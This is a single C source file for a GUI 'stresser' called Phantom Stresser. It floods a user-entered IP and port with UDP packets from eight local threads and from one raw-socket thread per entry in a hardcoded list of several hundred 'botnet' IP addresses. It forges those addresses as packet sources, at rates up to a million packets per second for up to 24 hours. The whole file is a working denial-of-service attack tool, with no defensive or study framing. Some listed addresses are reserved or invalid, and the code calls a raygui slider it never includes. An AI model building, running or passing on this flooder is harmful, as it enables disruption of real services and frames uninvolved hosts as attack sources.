// COMPILE AND RUN INSTRUCTIONS:
// attackpanel.c  --  Phantom Stresser (single-file raylib + real botnet UDP spoof flood)
// Compile (Linux example):
// gcc -O2 attackpanel.c -o phantom_stresser -lraylib -lGL -lm -lpthread -ldl
// Run: sudo ./phantom_stresser

// CAN ALSO BE RUN WITH THE CMAKELISTS METHOD, BUT WE'RE NOT LISTING THAT.

#include "raylib.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define SCREEN_W 540
#define SCREEN_H 680
#define MAX_THREADS 64
#define BOT_COUNT (sizeof(bot_ipv4_list)/sizeof(bot_ipv4_list[0]))

// Preset botnet IPs (your list)
static const char *bot_ipv4_list[] = {
    "24.5.119.233", "99.232.138.45", "24.36.74.18", "142.114.92.35", "68.149.122.180",
    "70.55.54.221", "50.67.91.48", "142.126.145.11", "24.212.171.14", "198.84.221.56",
    "184.66.78.145", "96.44.189.3", "50.70.234.198", "64.231.161.118", "142.117.109.9",
    "24.141.146.211", "99.233.67.107", "184.69.15.86", "74.210.76.22", "47.216.119.39",
    "38.86.150.50", "71.93.145.220", "174.112.133.29", "142.161.8.124", "24.53.92.47",
    "70.49.156.165", "142.166.103.244", "76.64.34.199", "135.23.120.86", "72.139.2.178",
    "68.144.102.13", "184.66.236.108", "199.175.56.10", "70.30.156.92", "38.104.136.66",
    "71.197.9.122", "104.57.10.105", "24.201.245.91", "47.55.69.131", "64.229.126.62",
    "174.5.146.113", "50.71.33.29", "47.23.182.18", "24.89.105.37", "216.121.69.75",
    "216.165.11.64", "64.183.75.215", "142.222.197.92", "47.147.124.34", "70.26.77.231",
    "142.165.215.120", "65.95.75.123", "72.38.140.28", "198.84.238.130", "38.122.68.201",
    "47.53.106.88", "142.117.190.206", "174.114.88.129", "24.156.159.217", "142.118.25.42",
    "24.138.199.68", "65.94.137.210", "50.68.181.67", "68.151.125.41", "47.52.78.14",
    "50.67.250.90", "99.234.145.33", "174.112.105.13", "24.84.170.21", "47.54.31.114",
    "64.228.36.77", "184.144.27.8", "47.55.116.199", "24.85.117.162", "216.209.122.187",
    "38.88.70.90", "47.148.221.50", "174.7.193.189", "104.223.94.130", "24.66.34.19",
    "142.134.126.85", "74.13.71.220", "198.91.69.33", "47.135.200.191", "64.180.138.116",
    "64.229.64.150", "47.52.64.216", "174.116.40.215", "216.108.234.149", "24.53.62.100",
    "50.70.23.207", "50.71.208.91", "142.165.19.192", "64.229.159.101", "47.23.20.180",
    "174.112.230.101", "104.246.176.42", "65.95.126.38", "184.70.226.161", "38.92.11.29",
    "185.57.56.122", "84.241.216.213", "82.217.111.12", "145.53.81.96", "37.97.190.154",
    "62.45.48.191", "145.129.18.72", "94.214.125.100", "31.151.64.89", "80.101.123.219",
    "84.24.199.141", "94.212.160.82", "86.84.191.121", "83.86.61.49", "84.82.213.12",
    "145.53.55.79", "91.204.177.151", "145.53.87.63", "86.83.191.178", "84.83.208.91",
    "213.127.201.87", "94.212.46.176", "86.83.31.153", "83.83.160.66", "145.53.3.101",
    "80.100.122.56", "83.82.176.10", "145.129.77.19", "145.129.52.89", "83.83.75.90",
    "77.165.79.231", "83.81.5.148", "94.215.94.145", "145.128.96.45", "83.84.44.222",
    "37.97.254.198", "86.83.199.66", "80.100.44.124", "145.129.201.22", "31.151.18.133",
    "145.53.100.57", "145.129.67.45", "145.128.201.98", "31.151.21.87", "145.129.12.64",
    "145.129.200.55", "37.97.178.91", "83.85.21.71", "145.53.190.25", "84.241.165.213",
    "68.231.122.221", "98.169.90.11", "50.35.198.144", "107.190.137.22", "174.109.140.215",
    "73.134.168.91", "71.195.242.187", "67.189.172.61", "24.22.15.238", "174.55.60.107",
    "107.77.234.152", "24.16.142.210", "104.58.112.38", "172.116.22.205", "174.25.200.16",
    "98.216.191.130", "24.14.115.60", "47.208.212.13", "174.103.200.157", "73.223.142.32",
    "73.161.186.193", "98.237.132.208", "24.24.73.210", "24.12.20.109", "98.237.183.73",
    "174.60.93.71", "47.222.163.221", "172.114.127.33", "67.170.45.192", "67.189.80.151",
    "174.21.6.67", "24.22.243.180", "98.176.230.17", "67.164.90.184", "73.83.105.228",
    "24.21.226.43", "174.109.82.219", "71.84.191.92", "73.183.71.150", "98.248.137.14",
    "73.136.187.112", "24.18.202.35", "47.221.146.14", "24.19.49.84", "98.230.151.228",
    "47.208.180.172", "71.231.17.40", "24.5.73.152", "24.113.13.56", "98.234.174.110",
    "87.1.98.248", "78.177.196.54", "29.197.128.100", "2.101.228.240",
    "58.135.103.251", "152.0.58.173", "142.213.213.154", "114.7.65.46",
    "109.237.122.156", "172.119.100.65", "104.191.243.101", "139.13.3.251",
    "32.197.116.101", "119.95.174.82", "170.127.222.253", "154.239.39.190",
    "142.210.48.60", "89.213.113.73", "212.164.249.219", "204.225.134.71",
    "159.114.150.8", "213.198.73.167", "201.227.147.120", "101.147.112.158",
    "120.1.227.103", "84.129.50.180", "65.74.97.97", "118.168.20.148",
    "160.41.132.246", "6.12.193.7", "111.171.193.237", "190.184.165.163",
    "82.31.255.16", "98.192.196.70", "34.206.45.145", "125.36.42.44",
    "197.130.123.7", "63.129.248.52", "117.251.101.17", "161.28.181.207",
    "5.112.19.104", "161.114.238.91", "18.121.230.34", "85.188.57.71",
    "200.107.167.247", "136.118.170.173", "17.137.69.227", "134.180.100.159",
    "134.239.11.50", "111.10.235.77", "87.23.17.209", "98.195.41.253",
    "177.231.94.168", "166.147.61.31", "34.214.143.146", "46.163.239.76",
    "91.230.129.61", "100.178.97.218", "69.173.101.74", "96.157.254.53",
    "52.195.42.37", "80.62.231.136", "135.78.224.48", "172.165.114.31",
    "178.70.231.27", "59.231.225.49", "221.246.77.168", "77.95.196.114",
    "218.141.22.201", "217.75.243.58", "77.115.101.92", "40.123.166.17",
    "114.250.107.29", "173.146.66.235", "179.133.116.160", "97.5.242.73",
    "116.146.80.92", "208.123.255.152", "181.62.174.104", "165.111.0.209",
    "58.98.157.110", "170.198.209.210", "78.129.140.118", "125.56.52.145",
    "33.61.221.155", "59.96.251.172", "27.224.81.210", "52.172.43.217",
    "182.131.207.161", "129.255.103.188", "51.6.217.212", "210.45.146.160",
    "32.208.217.37", "144.175.96.233", "31.226.231.138", "145.44.68.38",
    "48.85.212.174", "175.113.248.34", "62.207.143.41", "45.225.58.228",
    "52.228.2.100", "57.118.204.164", "129.217.132.31", "31.171.118.85",
    "100.113.85.197", "202.129.53.2", "51.31.176.207", "218.231.158.79",
    "130.237.162.121", "103.252.138.162", "19.233.212.32", "136.0.224.172",
    "136.52.228.195", "201.56.212.44", "149.246.223.216", "81.246.159.96",
    "29.244.111.1", "100.102.63.209", "14.73.30.169", "160.36.6.215",
    "183.145.200.107", "92.78.66.73", "69.33.2.111", "87.43.175.84",
    "179.109.50.6", "197.47.230.53", "216.248.188.222", "175.141.12.185",
    "71.91.33.206", "220.48.147.11", "174.248.213.178", "195.138.215.185",
    "57.75.172.6", "96.49.14.250", "47.69.221.230", "202.208.188.9",
    "138.59.58.238", "1.44.177.11", "219.202.90.129", "182.109.161.207",
    "219.78.49.233", "101.89.254.142", "128.211.225.51", "1.238.221.148",
    "172.76.138.248", "166.19.70.25", "46.34.63.203", "47.43.132.122",
    "64.69.108.12", "203.45.216.183", "42.69.121.127", "112.96.77.245",
    "164.63.194.180", "73.77.76.204", "38.81.147.164", "44.73.6.180",
    "4.85.109.237", "102.132.246.81", "141.133.33.175", "99.25.204.252",
    "148.246.102.117", "56.44.71.83", "137.107.230.10", "118.178.195.252",
    "139.126.116.185", "161.25.81.81", "134.144.110.173", "125.107.223.159",
    "168.121.188.111", "1.45.21.153", "75.147.40.148", "181.172.132.150",
    "222.25.36.91", "153.127.33.101", "125.189.102.213", "41.125.238.35",
    "192.199.82.254", "75.160.29.214", "137.71.13.213", "174.21.23.188",
    "42.6.151.68", "193.114.82.224", "142.202.114.82", "138.25.215.84",
    "53.31.56.105", "194.158.225.162", "166.187.99.64", "152.143.143.131",
    "220.26.96.138", "35.15.197.95", "202.70.161.141", "46.253.135.134",
    "35.133.119.242", "93.109.194.160", "109.123.234.134", "97.245.139.94",
    "183.251.154.28", "69.36.210.141", "150.209.199.224", "221.141.90.183",
    "13.23.89.14", "154.63.30.20", "118.58.252.81", "134.82.83.235",
    "125.60.64.231", "66.89.39.181", "150.183.97.220", "190.220.188.234",
    "152.168.120.227", "213.20.250.9", "136.241.150.154", "85.88.252.83",
    "40.251.46.54", "4.135.164.238", "167.171.207.249", "119.178.251.144",
    "87.60.186.187", "17.255.203.85", "204.214.58.85", "74.102.165.129",
    "50.233.158.251", "110.52.137.143", "71.233.176.202", "36.195.70.10",
    "36.49.73.144", "79.205.205.160", "105.100.176.56", "192.177.202.98",
    "140.233.152.16", "167.186.184.84", "51.182.19.90", "46.3.130.125",
    "140.104.48.81", "122.129.141.232", "101.3.216.218", "189.232.85.211",
    "143.100.110.230", "92.155.31.81", "115.29.63.112", "70.57.238.153",
    "104.206.95.101", "168.251.20.177", "117.134.113.14", "36.149.39.89",
    "188.166.135.72", "204.76.41.159", "207.58.217.71", "122.198.171.68",
    "79.185.114.207", "195.124.142.34", "64.41.107.127", "39.27.200.230",
    "124.223.5.140", "81.126.134.244", "204.129.254.169", "137.183.135.235",
    "102.13.115.149", "178.147.208.206", "208.212.77.149", "77.220.214.205",
    "43.61.4.36", "117.198.175.250", "109.122.143.86", "64.139.86.182",
    "1.219.105.66", "98.147.121.173", "223.248.56.44", "149.138.181.212",
    "62.235.54.99", "219.75.139.172", "158.59.185.174", "46.188.162.233",
    "44.125.233.100", "223.181.236.188", "9.25.143.65", "132.231.129.112",
    "196.4.35.246", "181.177.64.211", "13.168.162.224", "131.217.98.69",
    "136.134.34.64", "8.217.23.131", "164.58.132.114", "16.134.166.191",
    "115.11.18.69", "183.227.192.189", "196.18.217.224", "16.216.83.205",
    "37.153.183.224", "124.8.207.67", "195.150.4.26", "138.224.217.253",
    "180.25.97.210", "192.158.166.130", "106.236.150.24", "7.85.144.226",
    "31.78.168.28", "167.135.139.108", "228.94.51.205", "75.39.142.7",
    "51.7.138.144", "112.117.233.93", "254.114.94.19", "103.235.251.67",
    "207.70.146.148", "153.16.88.199", "205.214.84.232", "127.96.127.221",
    "43.189.181.79", "149.254.138.239", "187.208.74.135", "129.200.149.43",
    "247.231.247.31", "210.105.220.253", "95.78.39.156", "58.97.95.78",
    "249.84.147.145", "244.123.184.63", "8.149.181.180", "130.107.198.113",
    "121.189.234.199", "198.135.210.0", "247.251.148.152", "219.70.116.153",
    "201.121.0.1", "109.148.242.229", "31.142.67.50", "102.53.192.212",
    "94.191.113.78", "206.92.238.48", "108.75.37.151", "247.162.48.0",
    "255.25.247.179", "198.187.218.236", "148.157.184.158", "46.10.164.75",
    "248.78.83.38", "61.253.216.117", "30.116.248.169", "152.42.187.117",
    "238.172.59.109", "203.228.57.23", "165.22.136.93", "211.236.47.98",
    "164.52.240.107", "61.233.197.103", "7.224.210.206", "158.248.199.230",
    "215.14.173.170", "80.71.42.188", "129.251.77.244", "137.93.28.169",
    "238.234.127.108", "85.90.135.118", "90.140.15.207", "130.216.27.246",
    "205.111.58.95", "239.141.220.195", "166.203.255.132", "1.76.26.42",
    "148.123.5.169", "96.93.16.15", "94.170.176.241", "173.233.111.117",
    "75.75.191.25", "127.247.98.42", "245.153.157.91", "90.28.113.247",
    "57.139.130.98", "240.135.255.65", "184.93.254.27", "38.158.22.197",
    "241.223.133.171", "2.192.235.121", "145.242.19.109", "110.203.61.233",
    "31.172.186.142", "163.231.166.128", "136.80.92.22", "168.75.183.53",
    "91.45.2.153", "239.32.25.148", "91.245.151.48", "90.47.146.163",
    "19.231.209.53", "223.211.57.83", "251.87.115.188", "183.152.200.96",
    "96.102.62.55", "164.58.89.187", "88.165.68.69", "190.201.215.167",
    "191.14.53.64", "85.60.11.167", "139.68.129.224", "114.26.51.178",
    "60.23.102.245", "71.186.29.253", "248.98.115.50", "5.160.143.4",
    "111.124.78.88", "95.95.95.50", "26.64.105.179"
};

volatile int running = 1;
volatile long long total_packets = 0;
pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;

struct flood_info {
    struct sockaddr_in target;
    int sock;
    long pps_per_thread;
    int duration_sec;
    const char *spoof_ip;   // NULL = use real IP, otherwise spoof this source
};

// UDP + IP header for spoofing
struct pseudo_header {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t zero;
    uint8_t proto;
    uint16_t udp_len;
};

// Calculate checksum (standard Internet checksum)
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void *flood_thread(void *arg) {
    struct flood_info *fi = arg;
    char packet[1500];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    int payload_len = 512 + (rand() % 900);

    // Fill random payload
    for (int i = 0; i < payload_len; i++) payload[i] = rand() % 256;

    time_t end_time = time(NULL) + fi->duration_sec;

    while (running && time(NULL) < end_time) {
        // Build IP header if spoofing
        if (fi->spoof_ip) {
            memset(iph, 0, sizeof(struct iphdr));
            iph->version  = 4;
            iph->ihl      = 5;
            iph->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
            iph->id       = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl      = 64;
            iph->protocol = IPPROTO_UDP;
            iph->check    = 0;

            inet_pton(AF_INET, fi->spoof_ip, &iph->saddr);
            iph->daddr = fi->target.sin_addr.s_addr;

            // Pseudo-header for UDP checksum
            struct pseudo_header psh;
            psh.src_addr = iph->saddr;
            psh.dst_addr = iph->daddr;
            psh.zero     = 0;
            psh.proto    = IPPROTO_UDP;
            psh.udp_len  = htons(sizeof(struct udphdr) + payload_len);

            udph->source = htons(rand() % 65535);
            udph->dest   = fi->target.sin_port;
            udph->len    = htons(sizeof(struct udphdr) + payload_len);
            udph->check  = 0;

            // Checksum
            char chksum_buf[sizeof(struct pseudo_header) + sizeof(struct udphdr) + 1472];
            memcpy(chksum_buf, &psh, sizeof(psh));
            memcpy(chksum_buf + sizeof(psh), udph, sizeof(struct udphdr));
            memcpy(chksum_buf + sizeof(psh) + sizeof(struct udphdr), payload, payload_len);
            udph->check = checksum(chksum_buf, sizeof(psh) + sizeof(struct udphdr) + payload_len);

            iph->check = checksum(iph, sizeof(struct iphdr));

            if (sendto(fi->sock, packet,
                       sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len,
                       MSG_DONTWAIT,
                       (struct sockaddr *)&fi->target, sizeof(fi->target)) > 0) {
                pthread_mutex_lock(&mtx);
                total_packets++;
                pthread_mutex_unlock(&mtx);
            }
        }
        // Normal (non-spoofed) send
        else {
            if (sendto(fi->sock, payload, payload_len, MSG_DONTWAIT,
                       (struct sockaddr *)&fi->target, sizeof(fi->target)) > 0) {
                pthread_mutex_lock(&mtx);
                total_packets++;
                pthread_mutex_unlock(&mtx);
            }
        }

        usleep(100);  // ~10,000 packets/sec per thread — tune lower/higher
    }
    return NULL;
}

void start_attack(const char *target_ip, int target_port, long desired_pps, int duration) {
    int local_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (local_sock == -1) return;

    int sndbuf = 8 * 1024 * 1024;
    setsockopt(local_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target.sin_addr);

    // Raw socket for spoofing (one per bot thread to avoid contention)
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock == -1) {
        // If raw fails, we fall back to non-spoofed only
        printf("[!] Raw socket failed - spoofing disabled\n");
    } else {
        int one = 1;
        setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }

    int threads_local = 8;  // local machine threads
    int threads_bot = BOT_COUNT;  // one thread per bot IP

    long pps_per_local = desired_pps / (threads_local + 1);
    if (pps_per_local < 1000) pps_per_local = 1000;

    pthread_t th_local[threads_local];
    pthread_t th_bot[BOT_COUNT];
    struct flood_info fi_local[threads_local];
    struct flood_info fi_bot[BOT_COUNT];

    // Local threads (real source IP)
    for (int i = 0; i < threads_local; i++) {
        fi_local[i].sock = local_sock;
        fi_local[i].target = target;
        fi_local[i].pps_per_thread = pps_per_local;
        fi_local[i].duration_sec = duration;
        fi_local[i].spoof_ip = NULL;
        pthread_create(&th_local[i], NULL, flood_thread, &fi_local[i]);
    }

    // Bot/spoof threads (one per IP)
    if (raw_sock != -1) {
        for (int i = 0; i < BOT_COUNT; i++) {
            fi_bot[i].sock = raw_sock;
            fi_bot[i].target = target;
            fi_bot[i].pps_per_thread = pps_per_local / 4;  // slower per bot to not overwhelm
            fi_bot[i].duration_sec = duration;
            fi_bot[i].spoof_ip = bot_ipv4_list[i];
            pthread_create(&th_bot[i], NULL, flood_thread, &fi_bot[i]);
        }
    }

    // Threads run in background — GUI keeps responsive
    // You can add a "Stop" button that sets running=0 later
}

int main(void) {
    srand(time(NULL));

    InitWindow(SCREEN_W, SCREEN_H, "Phantom Stresser");
    SetTargetFPS(60);

    char ip[32] = "1.1.1.1";
    char port_str[16] = "80";
    float pps_slider = 0.25f;     // 1k → 1M PPS
    float time_slider = 0.36f;    // 60s → 24h
    bool attacking = false;

    Rectangle ip_box    = {120, 140, 220, 35};
    Rectangle port_box  = {370, 140,  80, 35};
    Rectangle pps_rect  = { 40, 260, 460, 40};
    Rectangle time_rect = { 40, 380, 460, 40};
    Rectangle btn_rect  = {110, 520, 320, 80};

    while (!WindowShouldClose()) {
        long pps = 1000 + (long)(pps_slider * 999000LL);
        int duration = 60 + (int)(time_slider * (86400 - 60));

        // Basic text input for IP/port
        if (IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
            Vector2 mouse = GetMousePosition();
            if (CheckCollisionPointRec(mouse, ip_box)) {
                // Very basic input - real apps would use raygui text box
            }
        }

        int key;
        while ((key = GetCharPressed()) > 0) {
            if (CheckCollisionPointRec(GetMousePosition(), ip_box)) {
                if ((key >= '0' && key <= '9') || key == '.') {
                    int len = strlen(ip);
                    if (len < 30) { ip[len] = key; ip[len+1] = '\0'; }
                }
            }
            if (CheckCollisionPointRec(GetMousePosition(), port_box)) {
                if (key >= '0' && key <= '9') {
                    int len = strlen(port_str);
                    if (len < 5) { port_str[len] = key; port_str[len+1] = '\0'; }
                }
            }
        }
        if (IsKeyPressed(KEY_BACKSPACE)) {
            if (strlen(ip) > 0) ip[strlen(ip)-1] = '\0';
            if (strlen(port_str) > 0) port_str[strlen(port_str)-1] = '\0';
        }

        // Start / Stop button
        if (IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
            if (CheckCollisionPointRec(GetMousePosition(), btn_rect)) {
                if (!attacking) {
                    int port = atoi(port_str);
                    if (port > 0 && port <= 65535) {
                        start_attack(ip, port, pps, duration);
                        attacking = true;
                        running = 1;
                        total_packets = 0;
                    }
                } else {
                    running = 0;
                    attacking = false;
                }
            }
        }

        BeginDrawing();
            ClearBackground((Color){26,26,26,255});

            DrawText("Phantom Stresser", 60, 30, 48, (Color){0,204,255,255});

            DrawText(TextFormat("Packets per second (PPS): %ld", pps), 40, 100, 24, WHITE);

            DrawText("Target", 40, 120, 28, (Color){0,204,255,255});
            DrawRectangleLinesEx(ip_box, 2, GRAY);
            DrawText(ip, ip_box.x+8, ip_box.y+8, 24, (Color){100,255,100,255});
            DrawText(":", 355, 145, 30, GRAY);
            DrawRectangleLinesEx(port_box, 2, GRAY);
            DrawText(port_str, port_box.x+8, port_box.y+8, 24, (Color){100,255,100,255});

            DrawText("Method: UDP Flood (Botnet + Local)", 40, 200, 24, (Color){0,204,255,255});

            DrawText("Packets per second (PPS)", 40, 240, 22, LIGHTGRAY);
            GuiSlider(pps_rect, "", "", &pps_slider, 0.0f, 1.0f);
            DrawText(TextFormat("%ld", pps), 220, 310, 40, (Color){0,255,136,255});

            DrawText("Time in Seconds", 40, 360, 22, LIGHTGRAY);
            GuiSlider(time_rect, "", "", &time_slider, 0.0f, 1.0f);
            DrawText(TextFormat("%d", duration), 220, 430, 40, (Color){255,170,0,255});

            Color btn_col = attacking ? (Color){220,60,60,255} : (Color){0,204,68,255};
            DrawRectangleRounded(btn_rect, 0.2f, 8, btn_col);
            DrawText(attacking ? "STOP ATTACK" : "⚡ START ATTACK", 140, 545, 36, WHITE);

            if (attacking || total_packets > 0) {
                DrawText(TextFormat("Packets sent: %lld", total_packets), 40, 620, 24, YELLOW);
                DrawText(TextFormat("Botnet size: %d IPs", (int)BOT_COUNT), 40, 650, 20, ORANGE);
            }

        EndDrawing();
    }

    running = 0;
    CloseWindow();
    return 0;
}